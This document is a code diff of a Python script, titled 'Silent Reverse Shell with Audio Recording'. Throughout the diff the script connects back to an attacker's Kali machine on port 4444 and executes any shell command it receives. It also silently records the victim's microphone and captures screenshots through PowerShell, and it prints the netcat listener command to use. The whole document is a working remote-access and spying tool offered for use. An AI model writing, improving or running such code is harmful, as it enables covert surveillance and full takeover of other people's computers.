@@ -1,81 +1,157 @@
-import sounddevice as sd
-import soundfile as sf
-import numpy as np
-import socket
+#!/usr/bin/env python3
+"""
+Silent Reverse Shell with Audio Recording
+Auto-installs requirements: sounddevice, soundfile, numpy
+"""
+
 import subprocess
-import os
 import sys
+import os
 import time
 
-def get_downloads_folder():
-    """Har PC ka Downloads folder auto-detect karein"""
-    try:
-        # Method 1: Windows Registry se
-        import winreg
-        subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey) as key:
-            downloads = winreg.QueryValueEx(key, "{374DE290-123F-4565-9164-39C4925E467B}")[0]
-            return downloads
-    except:
-        pass
+# ===== REQUIREMENTS AUTO-INSTALL (IMPROVED) =====
+def install_requirements():
+    """Automatically install required packages with better handling"""
     
-    try:
-        # Method 2: Environment variable se
-        return os.path.expanduser("~/Downloads")
-    except:
-        pass
+    required_packages = {
+        'sounddevice': 'sounddevice',
+        'soundfile': 'soundfile', 
+        'numpy': 'numpy'
+    }
     
-    try:
-        # Method 3: User profile se
-        return os.path.join(os.environ.get("USERPROFILE", "C:\\Users\\Default"), "Downloads")
-    except:
-        return "C:\\Downloads"
+    print("[*] Checking and installing requirements...")
+    print("[*] This may take a few moments...")
+    
+    missing_packages = []
+    
+    # Check which packages are missing
+    for package in required_packages:
+        try:
+            __import__(package)
+            print(f"[+] {package} already installed")
+        except ImportError:
+            missing_packages.append(required_packages[package])
+            print(f"[-] {package} not found")
+    
+    # Install missing packages
+    if missing_packages:
+        print(f"\n[*] Installing {len(missing_packages)} package(s): {', '.join(missing_packages)}")
+        
+        for package in missing_packages:
+            try:
+                print(f"[*] Installing {package}...")
+                # Try with --quiet flag to reduce output
+                subprocess.check_call(
+                    [sys.executable, "-m", "pip", "install", "--quiet", package],
+                    timeout=120  # 2 minutes timeout
+                )
+                print(f"[+] {package} installed successfully")
+                time.sleep(0.5)  # Small delay between installs
+            except subprocess.TimeoutExpired:
+                print(f"[!] {package} installation timed out, retrying...")
+                # Retry once
+                try:
+                    subprocess.check_call(
+                        [sys.executable, "-m", "pip", "install", package],
+                        timeout=120
+                    )
+                    print(f"[+] {package} installed successfully (retry)")
+                except:
+                    print(f"[!] Failed to install {package}, trying with --user flag...")
+                    try:
+                        subprocess.check_call(
+                            [sys.executable, "-m", "pip", "install", "--user", package],
+                            timeout=120
+                        )
+                        print(f"[+] {package} installed successfully (user mode)")
+                    except Exception as e:
+                        print(f"[ERROR] Could not install {package}: {e}")
+                        print(f"[!] Please install manually: pip install {package}")
+                        return False
+            except Exception as e:
+                print(f"[!] Failed to install {package}, retrying with --user flag...")
+                try:
+                    subprocess.check_call(
+                        [sys.executable, "-m", "pip", "install", "--user", package],
+                        timeout=120
+                    )
+                    print(f"[+] {package} installed successfully (user mode)")
+                except Exception as e2:
+                    print(f"[ERROR] Could not install {package}: {e2}")
+                    print(f"[!] Please install manually: pip install {package}")
+                    return False
+        
+        print("\n[+] All requirements installed successfully!")
+    else:
+        print("\n[+] All requirements already installed!")
+    
+    return True
+
+# Install requirements before importing
+print("\n" + "="*50)
+print("🔌 SILENT REVERSE SHELL (sounddevice)")
+print("="*50)
+
+if not install_requirements():
+    print("[!] Some requirements failed to install. Exiting...")
+    sys.exit(1)
+
+# ===== NOW IMPORT PACKAGES =====
+try:
+    import sounddevice as sd
+    import soundfile as sf
+    import numpy as np
+    import socket
+    import time
+    print("[+] All packages imported successfully!\n")
+except ImportError as e:
+    print(f"[ERROR] Failed to import packages: {e}")
+    print("[!] Please run: pip install sounddevice soundfile numpy")
+    sys.exit(1)
 
 def record_audio_silent(duration=10):
-    """sounddevice se background recording - Auto Downloads folder mein save"""
+    """sounddevice se background recording - Downloads folder mein save"""
     try:
         fs = 44100  # Sample rate
         
-        # ===== AUTO-DETECT DOWNLOADS FOLDER =====
-        downloads_dir = get_downloads_folder()
-        recordings_dir = os.path.join(downloads_dir, "Recordings")
+        # ===== DOWNLOADS FOLDER MEIN SAVE =====
+        downloads_dir = os.path.expanduser("~/Downloads/Recordings")
+        os.makedirs(downloads_dir, exist_ok=True)
         
-        # Folder create karein
-        os.makedirs(recordings_dir, exist_ok=True)
+        audio_file = os.path.join(downloads_dir, f"mic_{int(time.time())}.wav")
         
-        # File name with timestamp
-        audio_file = os.path.join(recordings_dir, f"mic_{int(time.time())}.wav")
-        
-        # Record (silent)
+        print(f"[*] Recording {duration} seconds...")
         recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
-        sd.wait()  # Wait until recording finished
+        sd.wait()
         
-        # Save as WAV
         sf.write(audio_file, recording, fs)
+        print(f"[+] Audio saved: {audio_file}")
         return audio_file
     except Exception as e:
+        print(f"[-] Recording error: {e}")
         return None
 
 def reverse_shell():
-    KALI_IP = "192.168.1..."  # Apna Kali IP
+    KALI_IP = "192.168.1.102"  # CHANGE THIS TO YOUR KALI IP
     KALI_PORT = 4444
     
     try:
+        print(f"[*] Connecting to {KALI_IP}:{KALI_PORT}...")
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((KALI_IP, KALI_PORT))
         
-        # Get downloads folder path
-        downloads_dir = get_downloads_folder()
-        recordings_dir = os.path.join(downloads_dir, "Recordings")
+        print("[+] Connected to Kali!")
         
         s.send(b"[+] Silent Recording Active! (sounddevice)\n")
-        s.send(f"[+] Files saved in: {recordings_dir}\n".encode())
+        s.send(b"[+] Files saved in: C:\\Users\\ASIF COMPUTERS\\Downloads\\Recordings\\\n")
         s.send(b"[+] Commands: record 10, screenshot, help, exit\n")
         
         while True:
             command = s.recv(1024).decode().strip()
             if not command:
                 break
+            
+            print(f"[*] Command received: {command}")
             
             if command.lower() == 'exit':
                 s.send(b"[-] Closing...\n")
@@ -100,21 +176,16 @@ def reverse_shell():
                     s.send(f"[-] Error: {e}\n".encode())
                 continue
             
-            # ===== SCREENSHOT =====
             if command.lower() == 'screenshot':
                 try:
-                    downloads_dir = get_downloads_folder()
-                    recordings_dir = os.path.join(downloads_dir, "Recordings")
-                    os.makedirs(recordings_dir, exist_ok=True)
-                    
-                    ps_script = f'''
+                    ps_script = '''
                     Add-Type -AssemblyName System.Windows.Forms
                     Add-Type -AssemblyName System.Drawing
                     $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                     $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                     $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                     $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
-                    $path = "{recordings_dir}\\screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png"
+                    $path = "$env:USERPROFILE\\Downloads\\Recordings\\screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png"
                     $bitmap.Save($path)
                     Write-Host "SAVED:$path"
                     '''
@@ -127,10 +198,8 @@ def reverse_shell():
                     s.send(f"[-] Error: {e}\n".encode())
                 continue
             
-            # ===== HELP =====
             if command.lower() == 'help':
-                recordings_dir = os.path.join(get_downloads_folder(), "Recordings")
-                help_msg = f"""
+                help_msg = """
                 ===== COMMANDS =====
                 record 10    - Record audio (silent) 10 sec
                 record 20    - Record audio (silent) 20 sec
@@ -141,12 +210,11 @@ def reverse_shell():
                 notepad      - Open Notepad
                 exit         - Close connection
                 ===================
-                Save Location: {recordings_dir}
+                Save Location: C:\\Users\\ASIF COMPUTERS\\Downloads\\Recordings\\
                 """
                 s.send(help_msg.encode())
                 continue
             
-            # ===== EXECUTE =====
             try:
                 output = subprocess.run(command, shell=True, capture_output=True, text=True)
                 result = output.stdout + output.stderr
@@ -157,15 +225,19 @@ def reverse_shell():
                 s.send(f"[-] Error: {e}\n".encode())
         
         s.close()
+        print("[+] Connection closed")
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f"[-] Connection error: {e}")
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("🔌 SILENT REVERSE SHELL (sounddevice)")
+    print("[*] Save Location: C:\\Users\\ASIF COMPUTERS\\Downloads\\Recordings\\")
+    print("[*] Make sure Kali is listening: nc -lvnp 4444")
     print("=" * 50)
-    downloads_dir = get_downloads_folder()
-    recordings_dir = os.path.join(downloads_dir, "Recordings")
-    print(f"[*] Save Location: {recordings_dir}")
-    print("=" * 50)
-    reverse_shell()
+    
+    try:
+        reverse_shell()
+    except KeyboardInterrupt:
+        print("\n[!] Exited by user")
+    except Exception as e:
+        print(f"[-] Error: {e}")
